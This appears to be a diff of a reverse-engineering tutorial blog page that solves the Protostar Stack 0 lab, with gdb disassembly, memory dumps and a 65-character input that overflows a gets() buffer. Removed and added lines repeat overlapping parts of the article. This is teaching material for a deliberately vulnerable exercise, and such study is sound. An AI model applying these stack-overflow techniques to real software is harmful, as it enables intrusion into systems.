-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>0x080483fd &lt;main+9&gt;:	mov    DWORD PTR <span style=color:#f92672>[</span>esp+0x5c<span style=color:#f92672>]</span>,0x0
-</code></pre></div><p>And then we come to this instruction which looks a bit familiar to us because we&rsquo;ve already seen that address esp+0x5c earlier. So, this seems like the initialization statement for a variable which is set to 0 and then later checked whether it is still 0 or not.</p>
-<h3 id=the-vulnerability>The vulnerability</h3>
-<p>Our task then is to make this variable (at location esp+0x5c) 0 or non-zero depending on what do the 2 puts statements do. The only access to influence the program we have is through the input we can give to <code>gets</code>. Hmm, so we dig deeper into the gets manpage and we see below:</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback>gets()  reads  a  line from stdin into the buffer pointed to by s until either a terminating newline or EOF, which it replaces with a null byte (&#39;\0&#39;).  No check for buffer overrun is performed (see BUGS below).
-</code></pre></div><p>Great! So we know that we need to update a value at address esp+0x5c and we know that we have a possibility to have unchecked writes done starting from esp+0x1c. You know where this is going, and we almost don&rsquo;t even need further dynamic analysis to crack this now. But I&rsquo;ll take you through a bit of dynamic analysis for a brief introduction to it and for confirming our theory.</p>
-<h3 id=dynamic-analysis>Dynamic Analysis</h3>
-<p>While in static analysis we carry out all our inspections without running the program, in dynamic analysis we monitor the internal state of the program while it is running. For this, we will run the program inside gdb. You should know the following basic commands for this:</p>
-<p><code>r</code>: Run the currently loaded program from beginning</p>
-<p><code>b *&lt;address></code>: Put a breakpoint at &lt;address> so that the program stops execution when it reaches that address.</p>
-<p><code>c</code>: Continue execution</p>
-<p><code>info r</code>: This displays the current state of the CPU&rsquo;s general purpose registers</p>
-<p><code>x/&lt;n>&lt;s> &lt;address/register></code>: This allows to examine the process memory at the given address or address contained in register. You can use various switches &lt;s> with it to display a specific amount of memory and in a specific format. e.g., /i displays the memory as instructions, /x as hex, /s as strings, etc. The number &lt;n> is used to display n units of memory</p>
-<p>Now, before we run the program, recall that we had 2 puts calls in our assembly code and we didn&rsquo;t know which one was the success case and which was failure. So we simply try to read the strings present at the addresses which were passed to the puts calls.</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> x/s 0x8048500
-0x8048500:	 <span style=color:#e6db74>&#34;you have changed the &#39;modified&#39; variable&#34;</span>
-<span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> x/s 0x8048529
-0x8048529:	 <span style=color:#e6db74>&#34;Try again?&#34;</span>
-<span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> 
-</code></pre></div><p>So we knnow that our first puts call is the success case and the second one is failure. Now, our observation was that if the value at esp+0x5c was 0, then it goes to the second puts call and otherwise it goes to first. So, we have to somehow make this value non-zero to get success.</p>
-<p>We know that our area of interest is in the gets call through which we can manipulate the program memory. So let&rsquo;s put couple of breakpoints, 1 before gets and 1 after and then run the program.</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> b *0x0804840c
-Breakpoint <span style=color:#ae81ff>1</span> at 0x804840c: file stack0/stack0.c, line 11.
-<span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> b *0x08048411
-Breakpoint <span style=color:#ae81ff>2</span> at 0x8048411: file stack0/stack0.c, line 13.
-<span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> r
-Starting program: /opt/protostar/bin/stack0 
-
-Breakpoint 1, 0x0804840c in main <span style=color:#f92672>(</span>argc<span style=color:#f92672>=</span>1, argv<span style=color:#f92672>=</span>0xbffff864<span style=color:#f92672>)</span>
-    at stack0/stack0.c:11
-11	stack0/stack0.c: No such file or directory.
-	in stack0/stack0.c
-<span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> 
-
-</code></pre></div><p>Now, we are stopped right before executing the gets call. We know that the input is taken at esp+0x1c and the target variable is located at esp+0x5c. So, let&rsquo;s see the state of the program memory around these areas.</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> x/30x $esp
-0xbffff750:	0xbffff76c	0x00000001	0xb7fff8f8	0xb7f0186e
-0xbffff760:	0xb7fd7ff4	0xb7ec6165	0xbffff778	0xb7eada75
-0xbffff770:	0xb7fd7ff4	0x08049620	0xbffff788	0x080482e8
-0xbffff780:	0xb7ff1040	0x08049620	0xbffff7b8	0x08048469
-0xbffff790:	0xb7fd8304	0xb7fd7ff4	0x08048450	0xbffff7b8
-0xbffff7a0:	0xb7ec6365	0xb7ff1040	0x0804845b	0x00000000
-0xbffff7b0:	0x08048450	0x00000000	0xbffff838	0xb7eadc76
-0xbffff7c0:	0x00000001	0xbffff864
-</code></pre></div><p>This shows us that the stack pointer is at 0xbffff750, the value at esp+0x1c (i.e. 0xbffff76c) is some non-zero value and the value at esp+0x5c (i.e. 0xbffff7ac) is 0 (matches the variable initialization value). Let&rsquo;s continue further to the next step, enter some known data as input and see the state of memory again.</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> c
-Continuing.
-AAAAAAAAAAAA
-
-Breakpoint 2, main <span style=color:#f92672>(</span>argc<span style=color:#f92672>=</span>1, argv<span style=color:#f92672>=</span>0xbffff864<span style=color:#f92672>)</span> at stack0/stack0.c:13
-13	in stack0/stack0.c
-<span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> x/30x $esp
-0xbffff750:	0xbffff76c	0x00000001	0xb7fff8f8	0xb7f0186e
-0xbffff760:	0xb7fd7ff4	0xb7ec6165	0xbffff778	0x41414141
-0xbffff770:	0x41414141	0x41414141	0xbffff700	0x080482e8
-0xbffff780:	0xb7ff1040	0x08049620	0xbffff7b8	0x08048469
-0xbffff790:	0xb7fd8304	0xb7fd7ff4	0x08048450	0xbffff7b8
-0xbffff7a0:	0xb7ec6365	0xb7ff1040	0x0804845b	0x00000000
-0xbffff7b0:	0x08048450	0x00000000	0xbffff838	0xb7eadc76
-0xbffff7c0:	0x00000001	0xbffff864
-<span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span>
-</code></pre></div><p>We entered <code>AAAAAAAAAAAA</code> as the input, i.e., 12 &lsquo;A&rsquo; characters as input and notice that 12 bytes starting from 0xbffff76c onwards now reflect as 0x41 (which is the <a href=http://www.asciitable.com/>ascii value</a> of A). So if we enter more number of As, we can continue overwriting more memory locations with 0x41 till we reach esp+0x5c. We can find the distance between the input variable and output variable addresses by doing this simple calculation of (esp+0x5c - esp+0x1c) or (0xbffff7ac - 0xbffff76c) which comes out to be 0x40 or 64. So, we need to input more than 64 As into the program to modify the variable and get the desired result.</p>
-<p>Try this out now on regular command line:</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>user@protostar:/opt/protostar/bin$ ./stack0
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-you have changed the <span style=color:#e6db74>&#39;modified&#39;</span> variable
-</code></pre></div><p>or if you know python</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>user@protostar:/opt/protostar/bin$ python -c <span style=color:#e6db74>&#39;print &#34;A&#34;*65&#39;</span> | ./stack0
-you have changed the <span style=color:#e6db74>&#39;modified&#39;</span> variable
-</code></pre></div><p>SUCCESS!</p>
-<h3 id=references--lessons-learnt>References / Lessons learnt</h3>
-<p>So, in this article, we learnt:</p>
-<ul>
-<li>About a very basic buffer overflow on the stack and how to exploit it.</li>
-<li>Static and dynamic analysis portions of reverse engineering</li>
-<li>strings command</li>
-<li>Introduction to x86 assembly</li>
-<li>Several gdb commands</li>
-<li>We also learnt that usage of <code>gets</code> function is very dangerous as it doesn&rsquo;t have any kind of check on the amount of input coming from the user versus the space we have to save it.</li>
-</ul>
-<p>You can refer to the below links for reading up more about some of the things discussed above. If you have any queries or suggestions, please leave a comment here or ping me <a href=https://twitter.com/shantanugoel/>@shantanugoel</a></p>
-<ul>
-<li><a href=https://www.owasp.org/index.php/Buffer_Overflow>Buffer Overflow</a></li>
-<li><a href=https://en.wikipedia.org/wiki/Stack_buffer_overflow>Stack Buffer Overflow</a></li>
-<li><a href=https://www.cs.virginia.edu/~evans/cs216/guides/x86.html>X86 Assembly Reference</a></li>
-<li><a href=http://visualgdb.com/gdbreference/commands/>GDB Commands Reference</a></li>
-</ul>
-<div class=blog-tags>
-<a href=https://shantanugoel.com/tags/practical-reverse-engineering-tutorial-series/>practical-reverse-engineering-tutorial-series</a>&nbsp;
+<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)"></button>
+<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><header class=header-section><div class="intro-header no-img"><div class=container><div class=row><div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1"><div class=posts-heading><h1>Practical Reverse Engineering Tutorials Part 1: Introduction & Protostar Stack 0</h1><hr class=small></div></div></div></div></div></header><div class=container role=main><div class=row><div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1"><nav id=TableOfContents><ul><li><a href=#what-is-this-about>What is this about?</a></li><li><a href=#exploit-exercises--protostar>Exploit Exercises / Protostar</a></li><li><a href=#setup>Setup</a></li><li><a href=#stack-0>Stack 0</a><ul><li><a href=#preparing-for-the-challenge>Preparing for the challenge</a></li><li><a href=#static-analysis>Static Analysis</a></li><li><a href=#the-vulnerability>The vulnerability</a></li><li><a href=#dynamic-analysis>Dynamic Analysis</a></li><li><a href=#references--lessons-learnt>References / Lessons learnt</a></li></ul></li></ul></nav><article role=main class=blog-post><h2 id=what-is-this-about>What is this about?</h2><p>This article is the 1st part of the <a href=/tags/practical-reverse-engineering-tutorial-series>Practical Reverse Engineering Tutorials</a> series. This series is geared towards a structured, but almost completely practical, approach to learn Reverse Engineering. Many of the existing articles/books take a long winded approach to teach RE which is prefixed with a lot of theory before the reader can get their hands dirty. This series will take a different approach of picking up various challenges in the order of increasing difficulty and help the reader in exploring ways how to break them. I&rsquo;ll try to keep mundane theory limited to the portions needed to beat the current challenge in consideration. Hopefully, this keeps the articles short, precise and interesting enough for readers to keep their attention span intact.</p><p>I&rsquo;d like to believe that these articles will prove helpful to those who are completely new to the world of reverse engineering. But I hope that even intermediate level readers would be able to make use of these by picking up the articles according to their appropriate levels.</p><p>Pre-requisite for these articles is basic knowledge of programming concepts, prefereably C. Any kind of prior experience with any assembly language is good but not mandatory.</p><p>For any queries, suggestions or feedback, please leave a comment here or ping me <a href=https://twitter.com/shantanugoel>@shantanugoel</a></p><h2 id=exploit-exercises--protostar>Exploit Exercises / Protostar</h2><p>For the first few articles of this series, we&rsquo;ll work through some of the challenges from <a href=https://exploit-exercises.com>Exploit Exercises</a>, starting with <a href=https://exploit-exercises.com/protostar/>Protostar</a>.</p><p>Note that although most of the challenges on exploit exercises provide source code of the challenge, we&rsquo;d try to hack our way using purely reverse engineering as much as possible without looking at the source code. This would lead to better learning and avoid guiding you towards the solution pre-maturely. I strongly recommend that you do not look at the C source unless you&rsquo;ve completed the below artcile fully or are not able to make connection to the assembly code at all after serious effort.</p><h2 id=setup>Setup</h2><p>To create the setup, follow the below steps:</p><ul><li>Download the Protostar ISO file from <a href=https://exploit-exercises.com/download/>https://exploit-exercises.com/download/</a></li><li>Download and install VMWare Workstation Player or VirtualBox</li><li>Create a new virtual machine in the vm software you downloaded using the nebula ISO from the first step</li><li>The iso is a live CD, so you can boot from it directly, instead of having to install it in the VM</li></ul><p>We&rsquo;re all set now to begin</p><h2 id=stack-0>Stack 0</h2><p><a href=https://exploit-exercises.com/protostar/stack0/>Stack0</a> is the first challenge in protostar.</p><h3 id=preparing-for-the-challenge>Preparing for the challenge</h3><p>The webpage says that the challenge is located at <code>/opt/protostar/bin/stack0</code>, so login to the VM and run this program. It looks like it is waiting for some input. On entering any data, it seems to tell us we were wrong with a message <code>Try again?</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>user@protostar:/opt/protostar/bin$ ./stack0
+</span></span><span style=display:flex><span>asd
+</span></span><span style=display:flex><span>Try again?
+</span></span><span style=display:flex><span>user@protostar:/opt/protostar/bin$ 
+</span></span></code></pre></div><p>We run <code>strings</code> command on the stack0 program to find out interesting text present in it, and see another one <code>you have changed the 'modified' variable</code>, which seems to be our target.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>user@protostar:/opt/protostar/bin$ strings stack0
+</span></span><span style=display:flex><span>/lib/ld-linux.so.2
+</span></span><span style=display:flex><span>__gmon_start__
+</span></span><span style=display:flex><span>libc.so.6
+</span></span><span style=display:flex><span>_IO_stdin_used
+</span></span><span style=display:flex><span>gets
+</span></span><span style=display:flex><span>puts
+</span></span><span style=display:flex><span>__libc_start_main
+</span></span><span style=display:flex><span>GLIBC_2.0
+</span></span><span style=display:flex><span>PTRh@
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>^_<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>you have changed the <span style=color:#e6db74>&#39;modified&#39;</span> variabley
+</span></span><span style=display:flex><span>Try again?
+</span></span><span style=display:flex><span>user@protostar:/opt/protostar/bin$ 
+</span></span></code></pre></div><h3 id=static-analysis>Static Analysis</h3><p>Now that we know what we need to achieve, we start our reverse engineering by doing static analysis of the program. There are several utilities to look at the low level code of the program. However, we will be using <code>gdb</code> here which can help us later in dynamic analysis as well. gdb or The GNU Project Debugger is a popular open source debugger. We&rsquo;ll graduate to more powerful tools or use reverse engineering oriented plugins for gdb later, but for now a vanilla gdb will do. It is already installed in the protostar VM. A debugger allows us to examine the internal state of the program as it executes at instruction/register level.</p><p>Some of the important commands that you&rsquo;d use during the static analysis for this challenge are:</p><p><code>set disassembly-flavor intel</code>: While this is optional, but it allows to see the disassembled code in a more readable format.</p><p><code>disassemble &lt;function></code>: This command displays the disassembled code of <code>function</code></p><p>You can read more about these commands at <a href=https://sourceware.org/gdb/current/onlinedocs/gdb/>https://sourceware.org/gdb/current/onlinedocs/gdb/</a> or <a href=http://visualgdb.com/gdbreference/commands/>http://visualgdb.com/gdbreference/commands/</a></p><p>Using the above information, we load the <code>stack0</code> executable in GDB and disassemble the function <code>main</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>user@protostar:/opt/protostar/bin$ gdb stack0
+</span></span><span style=display:flex><span>GNU gdb <span style=color:#f92672>(</span>GDB<span style=color:#f92672>)</span> 7.0.1-debian
+</span></span><span style=display:flex><span>Copyright <span style=color:#f92672>(</span>C<span style=color:#f92672>)</span> <span style=color:#ae81ff>2009</span> Free Software Foundation, Inc.
+</span></span><span style=display:flex><span>License GPLv3+: GNU GPL version <span style=color:#ae81ff>3</span> or later &lt;http://gnu.org/licenses/gpl.html&gt;
+</span></span><span style=display:flex><span>This is free software: you are free to change and redistribute it.
+</span></span><span style=display:flex><span>There is NO WARRANTY, to the extent permitted by law.  Type <span style=color:#e6db74>&#34;show copying&#34;</span>
+</span></span><span style=display:flex><span>and <span style=color:#e6db74>&#34;show warranty&#34;</span> <span style=color:#66d9ef>for</span> details.
+</span></span><span style=display:flex><span>This GDB was configured as <span style=color:#e6db74>&#34;i486-linux-gnu&#34;</span>.
+</span></span><span style=display:flex><span>For bug reporting instructions, please see:
+</span></span><span style=display:flex><span>&lt;http://www.gnu.org/software/gdb/bugs/&gt;...
+</span></span><span style=display:flex><span>Reading symbols from /opt/protostar/bin/stack0...done.
+</span></span><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> set disassembly-flavor intel
+</span></span><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> disassemble main
+</span></span><span style=display:flex><span>Dump of assembler code <span style=color:#66d9ef>for</span> <span style=color:#66d9ef>function</span> main:
+</span></span><span style=display:flex><span>0x080483f4 &lt;main+0&gt;:	push   ebp
+</span></span><span style=display:flex><span>0x080483f5 &lt;main+1&gt;:	mov    ebp,esp
+</span></span><span style=display:flex><span>0x080483f7 &lt;main+3&gt;:	and    esp,0xfffffff0
+</span></span><span style=display:flex><span>0x080483fa &lt;main+6&gt;:	sub    esp,0x60
+</span></span><span style=display:flex><span>0x080483fd &lt;main+9&gt;:	mov    DWORD PTR <span style=color:#f92672>[</span>esp+0x5c<span style=color:#f92672>]</span>,0x0
+</span></span><span style=display:flex><span>0x08048405 &lt;main+17&gt;:	lea    eax,<span style=color:#f92672>[</span>esp+0x1c<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>0x08048409 &lt;main+21&gt;:	mov    DWORD PTR <span style=color:#f92672>[</span>esp<span style=color:#f92672>]</span>,eax
+</span></span><span style=display:flex><span>0x0804840c &lt;main+24&gt;:	call   0x804830c &lt;gets@plt&gt;
+</span></span><span style=display:flex><span>0x08048411 &lt;main+29&gt;:	mov    eax,DWORD PTR <span style=color:#f92672>[</span>esp+0x5c<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>0x08048415 &lt;main+33&gt;:	test   eax,eax
+</span></span><span style=display:flex><span>0x08048417 &lt;main+35&gt;:	je     0x8048427 &lt;main+51&gt;
+</span></span><span style=display:flex><span>0x08048419 &lt;main+37&gt;:	mov    DWORD PTR <span style=color:#f92672>[</span>esp<span style=color:#f92672>]</span>,0x8048500
+</span></span><span style=display:flex><span>0x08048420 &lt;main+44&gt;:	call   0x804832c &lt;puts@plt&gt;
+</span></span><span style=display:flex><span>0x08048425 &lt;main+49&gt;:	jmp    0x8048433 &lt;main+63&gt;
+</span></span><span style=display:flex><span>0x08048427 &lt;main+51&gt;:	mov    DWORD PTR <span style=color:#f92672>[</span>esp<span style=color:#f92672>]</span>,0x8048529
+</span></span><span style=display:flex><span>0x0804842e &lt;main+58&gt;:	call   0x804832c &lt;puts@plt&gt;
+</span></span><span style=display:flex><span>0x08048433 &lt;main+63&gt;:	leave  
+</span></span><span style=display:flex><span>0x08048434 &lt;main+64&gt;:	ret    
+</span></span><span style=display:flex><span>End of assembler dump.
+</span></span><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> 
+</span></span></code></pre></div><h4 id=making-sense-of-the-assembly-code>Making sense of the assembly code</h4><p>Well, so we got a&mldr;.big pile of gibberish? So, this is how assembly code looks like. Very different from a regular C program, as you can see. On the left side, you can see the memory addresses where a particular instruction is present and on the right side the instruction. Each instruction is again composed of two parts:</p><ul><li>The instruction itself</li><li>0 or more operands (which can be addresses or registers with some specific formatting that we will learn as we encounter it)</li></ul><p>Now, although this is a small enough program, as good reverse engineers, we rarely go through the whole program immediately which would require us to know each assembly instruction as well as take a lot of time. So, instead we will make some intelligent guesses and look at only the instructions/code that we really need to know. Just know these basic things before moving forward:</p><ul><li>Any instruction that works on some data either takes one or more addresses and/or registers as operands, which it operates on</li><li>A register like eax is a basically a temporary/scratch memory close to the CPU for getting fast access to a data being used locally frequently</li><li>There are few special registers. For current problem, know that ebp is the Stack Base pointer or the bottom of current stack frame, esp is the stack pointer or the current top of the stack, eip is the instruction pointer or the address of the instruction which is just about to be executed. We&rsquo;ll learn more about the ebp/esp when we do a real stack overflow problem</li><li>A square bracket <code>[]</code> around a address or register signifies that the instruction refers to the value present in that address/register as the source or destination of the operation instead of the address/register itself.</li><li>For most operations involving a source and destination operand, the left operand is the destination.</li></ul><p>If you face problem in understanding the below information and think you need to understand x86 assembly a bit more before moving forward, you can use this very short and simple guide for the same: <a href=https://www.cs.virginia.edu/~evans/cs216/guides/x86.html>https://www.cs.virginia.edu/~evans/cs216/guides/x86.html</a></p><p>Many times, my first intuition is to find out the areas in code which lead to our success/failure cases and work backwards from there. From our preparation phase, we saw that the failure case printed a message <code>Try again?</code> on the screen and the success case was potentially a message <code>you have changed the 'modified' variable</code>. Skimming over the code quickly, you will notice 3 peculiar statements that you may already be familiar from your C programming.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>0x0804840c &lt;main+24&gt;:	call   0x804830c &lt;gets@plt&gt;
+</span></span><span style=display:flex><span>...
+</span></span><span style=display:flex><span>0x08048420 &lt;main+44&gt;:	call   0x804832c &lt;puts@plt&gt;
+</span></span><span style=display:flex><span>...
+</span></span><span style=display:flex><span>0x0804842e &lt;main+58&gt;:	call   0x804832c &lt;puts@plt&gt;
+</span></span></code></pre></div><p>If you don&rsquo;t remember what <code>gets</code> and <code>puts</code> do, you can look at their descriptions from their manpages (e.g. <code>man puts</code>). In brief, <code>gets</code> allows you to capture user input from stdin and <code>puts</code> allows you to print output to stdout to display to the user. This matches with our observations in the previous section that it waited for user input when we ran the program and gave an error message on receiving the input. We also saw a 2nd string which was potentially the success message. So we have 1 gets and 2 puts statements corresponding to this, but we don&rsquo;t know yet which one of the 2 puts statements is the success part and which one is the failure part.</p><p>Anyways, we start moving a bit backwards from the first puts statement and try to make sense of each instruction:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>0x08048420 &lt;main+44&gt;:	call   0x804832c &lt;puts@plt&gt;
+</span></span></code></pre></div><p>Here, the <code>call</code> instruction refers to calling a function specified by the address 0x804832c. The string inside &lt;> is the disassembler telling you the symbol name associated with that address.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>0x08048419 &lt;main+37&gt;:	mov    DWORD PTR <span style=color:#f92672>[</span>esp<span style=color:#f92672>]</span>,0x8048500
+</span></span></code></pre></div><p>Here, the <code>mov</code> instruction is moving the value 0x8048500 into the address pointed by the register esp. The X86 calling convention puts the arguments to a function onto the stack before calling it and here the esp is the &ldquo;Stack pointer&rdquo; register. So, this must be the address of the string being passed to puts that it must print. Keep this address 0x8048500 in mind for our next section (Dynamic Analysis).</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>0x08048411 &lt;main+29&gt;:	mov    eax,DWORD PTR <span style=color:#f92672>[</span>esp+0x5c<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>0x08048415 &lt;main+33&gt;:	test   eax,eax
+</span></span><span style=display:flex><span>0x08048417 &lt;main+35&gt;:	je     0x8048427 &lt;main+51&gt;
+</span></span></code></pre></div><p>Here we see that first we move some data from the address esp + 0x5c into eax. then the <code>test</code> instruction checks whether eax is zero or not. It does this by AND&rsquo;ing the left and right operand. Since eax is the left as well as the right operand, the AND result will be zero only if eax is zero. Then the <code>je</code> (or jump if equal to) instruction will jump the program execution to the address 0x8048427 (i.e. it will skip the first puts statement and start executing near our 2nd puts statement) if eax was zero. Otherwise it will execute the first puts statement. It decides the &ldquo;equal to&rdquo; condition by looking at an internal flag called Zero Flag (or Z or ZF) and treats equals condition to be true if this flag is set. This is because a <code>test</code> or a <code>cmp</code> (compare) instruction will set the ZF to 1 if result of the AND of 2 operands (in case of test) or difference of 2 operands (in case of cmp) was 0.</p><p>This seems like our decision maker code as if we can manipulate the value at [esp+0x5c] then we can control the flow of the program to either of the puts statements. So, let&rsquo;s keep this address in mind for our dynamic analysis.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>0x08048405 &lt;main+17&gt;:	lea    eax,<span style=color:#f92672>[</span>esp+0x1c<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>0x08048409 &lt;main+21&gt;:	mov    DWORD PTR <span style=color:#f92672>[</span>esp<span style=color:#f92672>]</span>,eax
+</span></span><span style=display:flex><span>0x0804840c &lt;main+24&gt;:	call   0x804830c &lt;gets@plt&gt;
+</span></span></code></pre></div><p>Finally we reach the user input call. <code>lea</code> instruction means &ldquo;Load effective address&rdquo;. It is a slightly tricky instruction in the sense that:</p><ul><li>it does the calculations only on the right side operand, not both and then stores the result in left operand</li><li>the square brackets [] don&rsquo;t really refer to the meaning that we know from other instructions (i.e. you dont need to find out further the value present at calculated address and can just ignore the [])</li></ul><p>Combining this knowledge with the semantics of mov/call that we learnt earlier, we know that the program is collecting the user input and storing that into a location starting at esp+0x1c.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>0x080483fd &lt;main+9&gt;:	mov    DWORD PTR <span style=color:#f92672>[</span>esp+0x5c<span style=color:#f92672>]</span>,0x0
+</span></span></code></pre></div><p>And then we come to this instruction which looks a bit familiar to us because we&rsquo;ve already seen that address esp+0x5c earlier. So, this seems like the initialization statement for a variable which is set to 0 and then later checked whether it is still 0 or not.</p><h3 id=the-vulnerability>The vulnerability</h3><p>Our task then is to make this variable (at location esp+0x5c) 0 or non-zero depending on what do the 2 puts statements do. The only access to influence the program we have is through the input we can give to <code>gets</code>. Hmm, so we dig deeper into the gets manpage and we see below:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>gets()  reads  a  line from stdin into the buffer pointed to by s until either a terminating newline or EOF, which it replaces with a null byte (&#39;\0&#39;).  No check for buffer overrun is performed (see BUGS below).
+</span></span></code></pre></div><p>Great! So we know that we need to update a value at address esp+0x5c and we know that we have a possibility to have unchecked writes done starting from esp+0x1c. You know where this is going, and we almost don&rsquo;t even need further dynamic analysis to crack this now. But I&rsquo;ll take you through a bit of dynamic analysis for a brief introduction to it and for confirming our theory.</p><h3 id=dynamic-analysis>Dynamic Analysis</h3><p>While in static analysis we carry out all our inspections without running the program, in dynamic analysis we monitor the internal state of the program while it is running. For this, we will run the program inside gdb. You should know the following basic commands for this:</p><p><code>r</code>: Run the currently loaded program from beginning</p><p><code>b *&lt;address></code>: Put a breakpoint at &lt;address> so that the program stops execution when it reaches that address.</p><p><code>c</code>: Continue execution</p><p><code>info r</code>: This displays the current state of the CPU&rsquo;s general purpose registers</p><p><code>x/&lt;n>&lt;s> &lt;address/register></code>: This allows to examine the process memory at the given address or address contained in register. You can use various switches &lt;s> with it to display a specific amount of memory and in a specific format. e.g., /i displays the memory as instructions, /x as hex, /s as strings, etc. The number &lt;n> is used to display n units of memory</p><p>Now, before we run the program, recall that we had 2 puts calls in our assembly code and we didn&rsquo;t know which one was the success case and which was failure. So we simply try to read the strings present at the addresses which were passed to the puts calls.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> x/s 0x8048500
+</span></span><span style=display:flex><span>0x8048500:	 <span style=color:#e6db74>&#34;you have changed the &#39;modified&#39; variable&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> x/s 0x8048529
+</span></span><span style=display:flex><span>0x8048529:	 <span style=color:#e6db74>&#34;Try again?&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> 
+</span></span></code></pre></div><p>So we knnow that our first puts call is the success case and the second one is failure. Now, our observation was that if the value at esp+0x5c was 0, then it goes to the second puts call and otherwise it goes to first. So, we have to somehow make this value non-zero to get success.</p><p>We know that our area of interest is in the gets call through which we can manipulate the program memory. So let&rsquo;s put couple of breakpoints, 1 before gets and 1 after and then run the program.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> b *0x0804840c
+</span></span><span style=display:flex><span>Breakpoint <span style=color:#ae81ff>1</span> at 0x804840c: file stack0/stack0.c, line 11.
